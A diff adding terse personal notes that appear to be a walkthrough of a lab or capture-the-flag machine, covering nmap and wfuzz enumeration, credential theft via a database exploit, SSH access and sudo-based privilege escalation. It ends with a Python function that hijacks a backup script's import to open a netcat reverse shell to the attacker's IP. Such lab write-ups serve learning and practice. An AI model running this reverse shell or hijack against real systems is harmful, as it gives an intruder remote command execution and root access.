@@ -1,0 +1,34 @@
+nmap 
+
+nmap -Pn -A -T4 -p- 10.10.10.187
+
+
+
+
+fuzz for 404 or 043 website
+wfuzz -c -w /usr/share/wordlists/wfuzz/general/big.txt -z list,txt-php-html -u http://10.10.10.187/admin-dir/FUZZ.FUZ2Z --hc 404,403 -t 100
+
+wfuzz -c -w /usr/share/wordlists/dirb/big.txt -z list,txt-php-html -u http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z --hc 404,403 -t 100
+
+
+
+on webpage we are not getting anything fuzzing is our option.
+
+we get files and cred then with cred we get admirer login page.
+using admirer exploit to connect to remote database and use sql command we get our cred.
+
+
+and ssh in it.
+sudo -l
+
+after searching we got backup.py runing
+and we can cat it from waldo
+we see a function in it.
+we use this function to run out nc 
+
+import os 
+
+def make_archive(a, b, c): # need 3 paramaters like the real function even if they won't be used
+	os.system('nc 10.10.15.203 4444 -e "/bin/sh"')
+
+
